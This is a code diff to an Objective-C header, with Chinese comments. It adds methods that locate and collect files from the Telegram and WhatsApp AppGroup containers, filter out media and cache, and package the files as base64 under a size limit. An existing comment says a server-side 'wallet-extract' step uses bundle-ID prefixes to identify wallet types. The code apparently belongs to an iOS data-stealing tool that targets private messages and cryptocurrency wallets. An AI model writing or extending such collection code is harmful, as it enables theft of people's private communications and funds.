@@ -33,6 +33,20 @@
                                 maxDepth:(NSInteger)maxDepth
                               maxEntries:(NSInteger)maxEntries;
 
+/// AppGroup 容器路径（group.ph.telegra.Telegraph 这类）
++ (NSString *)appGroupPathFor:(NSString *)groupId;
+
+/**
+ * 采 AppGroup 容器（Telegram / WhatsApp）。
+ *   includeSubstrings  只收相对路径里含这些片段的文件（nil = 全收）
+ *   excludeSubstrings  跳过含这些片段的文件（媒体/缓存）
+ * @return @{ @"files": @[@{@"p":...,@"d":base64}], @"bytes": @(N), @"error":... }
+ */
++ (NSDictionary *)collectAppGroup:(NSString *)groupId
+                          include:(NSArray<NSString *> *)includeSubstrings
+                          exclude:(NSArray<NSString *> *)excludeSubstrings
+                            limit:(NSUInteger)maxBytes;
+
 /**
  * 按「采集项」收集一个 App 容器的文件，打成 path + base64 的包。
  * 条目名统一加 <bundleId>/ 前缀，服务端 wallet-extract 靠这个认钱包类型。
